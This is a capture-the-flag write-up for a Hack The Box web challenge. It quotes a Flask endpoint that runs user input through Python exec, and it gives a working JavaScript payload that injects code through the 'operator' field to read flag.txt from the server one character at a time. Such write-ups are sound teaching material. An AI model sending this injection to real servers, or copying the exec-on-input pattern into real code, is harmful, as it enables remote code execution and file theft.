# Evaluation Deck

>  A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

## Solution
We are given the source code for the website, after reading some of the code, I found an API that features an interesting method that supposedly calculates the health of the ghost (in the website) from the given parameters.

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```
However, they are using Python's `compile` and `exec` function, which can be very dangerous when executed from unsanitized user input.

We can control all the parameters, but `current_health` and `attack_power` are converted to int and that limits us to passing only numbers.

That leaves us with `operator` that needs to be added to two numbers. So I tried to find a way to convert the flag into a number which can then be converted back  into the flag itself.

I ended up converting the flag into `ASCII` unicode using the following function :

```python
ord(character)
```

So the final payload to be sent as a POST reqeust to api:

```javascript
let str = "";
for (let i = 0; i < 50; i++) {
  fetch("[IP]/api/get_health", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      current_health: "0",
      attack_power: "0",
      operator: `+ ord(open("../../../flag.txt").read()[${i}]);`,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      str += data.message + " ";
    });
}
```
Then I got the result in ascii unicode, so I converted it back to characters using the following function :
```python
chr(ascii unicode)
```
The Flag:
```
HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```